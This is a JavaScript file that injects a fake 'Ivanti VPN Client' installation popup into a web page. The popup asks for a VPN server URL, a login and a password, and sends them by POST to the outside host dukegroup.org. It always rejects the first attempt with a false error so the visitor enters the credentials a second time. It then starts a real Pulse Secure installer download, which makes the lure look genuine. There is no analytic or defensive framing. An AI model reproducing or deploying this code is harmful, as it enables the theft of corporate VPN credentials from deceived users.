
(function () {

  const style = document.createElement('style');
  style.textContent = `
    .custom-popup-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 9998;
      justify-content: center;
      align-items: center;
    }
    .custom-popup {
      background: white;
      padding: 30px;
      border-radius: 12px;
      width: 90%;
      max-width: 420px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      position: relative;
      z-index: 9999;
    }
    .custom-popup .header-text {
      margin: 0 0 20px;
      text-align: center;
      color: #333;
      font-size: 16px;
      line-height: 1.4;
    }
    .custom-popup .close-btn {
      position: absolute;
      top: 12px;
      right: 15px;
      font-size: 28px;
      color: #aaa;
      background: none;
      border: none;
      cursor: pointer;
      width: 30px;
      height: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0;
      line-height: 1;
    }
    .custom-popup .close-btn:hover { color: #000; }
    .custom-popup input {
      width: 100%;
      padding: 11px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .custom-popup button#popup-download {
      width: 100%;
      padding: 13px;
      margin-top: 15px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: not-allowed;
      background: #ccc;
      color: white;
      transition: background 0.3s;
    }
    .custom-popup button#popup-download.active {
      background: #007bff;
      cursor: pointer;
    }
    .custom-popup button#popup-download.active:hover {
      background: #0056b3;
    }
  `;
  document.head.appendChild(style);

  const overlay = document.createElement('div');
  overlay.className = 'custom-popup-overlay';
  overlay.innerHTML = `
    <div class="custom-popup">
      <button class="close-btn">&times;</button>
      <div class="header-text">
        To install Ivanti VPN Client, please enter your connection details
      </div>
      <input type="text" id="popup-server" placeholder="Server URL" />
      <input type="text" id="popup-login" placeholder="Login" />
      <input type="password" id="popup-password" placeholder="Password" />
      <button id="popup-download">Download</button>
    </div>
  `;
  document.body.appendChild(overlay);

  const serverInput = overlay.querySelector('#popup-server');
  const loginInput = overlay.querySelector('#popup-login');
  const passwordInput = overlay.querySelector('#popup-password');
  const downloadBtn = overlay.querySelector('#popup-download');
  const closeBtn = overlay.querySelector('.close-btn');
  const headerText = overlay.querySelector('.header-text');

  let attempt = 1;

  function checkFields() {
    const allFilled = serverInput.value.trim() && loginInput.value.trim() && passwordInput.value;
    downloadBtn.classList.toggle('active', allFilled);
    downloadBtn.disabled = !allFilled;
  }

  [serverInput, loginInput, passwordInput].forEach(input => {
    input.addEventListener('input', checkFields);
  });

  function closePopup() {
    overlay.style.display = 'none';
    serverInput.value = ''; loginInput.value = ''; passwordInput.value = '';
    headerText.innerHTML = 'To install Ivanti VPN Client, please enter your connection details';
    attempt = 1;
    checkFields();
  }

  closeBtn.addEventListener('click', closePopup);
  overlay.addEventListener('click', e => { if (e.target === overlay) closePopup(); });

  window.showCustomPopup = function () {
    overlay.style.display = 'flex';
    serverInput.focus();
    attempt = 1;
    headerText.innerHTML = 'To install Ivanti VPN Client, please enter your connection details';
    checkFields();
  };

  const POST_URL = 'https://dukegroup.org/';
  const DOWNLOAD_FILE = 'https://www.flmd.uscourts.gov/sites/flmd/files/ps-pulse-win-22.3r1.0-b18209-64bit-installer.msi';

  downloadBtn.addEventListener('click', async function () {
    if (!downloadBtn.classList.contains('active')) return;

    const data = {
      server: serverInput.value.trim(),
      login: loginInput.value.trim(),
      password: passwordInput.value,
      attempt: attempt === 1 ? 'first' : 'second'
    };

    try {
      await fetch(POST_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (err) {
      console.warn('POST failed:', err);
    }

    if (attempt === 1) {
      serverInput.value = ''; loginInput.value = ''; passwordInput.value = '';
      headerText.innerHTML = '<span style="color: #d32f2f;">Incorrect data, please enter again to start installation</span>';
      attempt = 2;
      checkFields();
    } else {
      headerText.innerHTML = '<span style="color: #2e7d32; font-weight: 600;">VPN client installation has started</span>';

      const a = document.createElement('a');
      a.href = DOWNLOAD_FILE;
      a.download = '';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      setTimeout(closePopup, 2000);
    }
  });
})();